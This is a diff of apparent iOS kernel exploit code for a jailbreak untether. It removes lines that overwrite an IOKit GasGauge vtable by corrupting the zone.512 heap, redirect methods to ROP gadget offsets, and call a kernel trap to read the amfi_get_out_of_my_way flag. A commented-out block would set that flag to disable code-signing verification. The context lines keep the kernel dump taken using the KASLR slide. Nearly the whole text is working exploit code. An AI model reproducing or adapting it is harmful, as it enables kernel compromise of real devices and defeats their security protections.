@@ -1142,54 +1142,11 @@ int main(int argc, char** argv)
 		kernelDumper.init(&kernelReader, kaslr_slide);
 		kernelDumper.dumpKernel(kernelDump, 0x10000 * 256);
 
-		patchFinder.init(kaslr_slide);
-		patchFinder.findPatchesForKernel(kernelDump);
-		patchFinder.prinfOffsets();
-		
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X8_W1_SXTW_2;
-
-		// patch index
-		vtdump[kGasGaugeVtable_getExternalTrapForIndex] = patchFinder.ADD_X0_232;
-
-		// update vtable pointer in vtdump
-		uint32_t childOffset = (kTargetZoneOriginal - kVMMapCopySize) / sizeof(uint64_t);
-		vtdump[childOffset + 0] = kernelReader.getParentDataAddress();	// [117]
-		vtdump[childOffset + 1] = child[1];								// [118]
-		vtdump[childOffset + 2] = child[2];								// [119]
-		vtdump[childOffset + 3] = child[3];								// [120]
-		
-		UTZLog(@"[INF:UTZ] move vtable and overwrite pointer");
-		
-		// overwrite parent data (w/o header) + entire child blob
-		uint32_t overlapSize = kTargetZoneOriginal - kVMMapCopySize + kTargetZoneOriginal;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-
-		/*// set AMFI_GET_OUT_OF_MY_WAY to 1 (disable code signing verification)
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.STRB_W1_X8_W2_UXTW;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		ggService512.callIndex0Trap5(0x1, patchFinder.AMFI_GET_OUT_OF_MY_WAY - vtdump[147], 0x43434343, 0x44444444, 0x45454545);*/
-		
-		// vertify
-		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X8_W1_SXTW_2;
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
-		uint32_t cs_flag = ggService512.callIndex0Trap5((patchFinder.AMFI_GET_OUT_OF_MY_WAY - vtdump[147])>>2, 0x42424242, 0x43434343, 0x44444444, 0x45454545);
-		UTZLog(@"[INF:UTZ] 0x%.16llX: amfi_get_out_of_my_way = 0x%.8lX", patchFinder.AMFI_GET_OUT_OF_MY_WAY, cs_flag);
-		
-		// revert vtable pointer
-		memcpy(&vtdump[childOffset], &child[0], kTargetZoneOriginal);
-		
-		// overwrite parent data (w/o header) + entire child blob
-		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, kTargetZoneOriginal - kVMMapCopySize + kTargetZoneOriginal);
-		
 		UTZLog(@"[INF:UTZ] depoison zone.512");
 		kernelReader.replaceObjectWithChild(kTargetZoneChildPoisoned, [&ggService512] () {
 			ggService512.close();
 			ggService512.wait();
 		});
-		
-		// AFMI is disabled, ready to spawn actual untether
-		if (cs_flag == 0x1)
-			success = true;
 	}
 	
 bail:
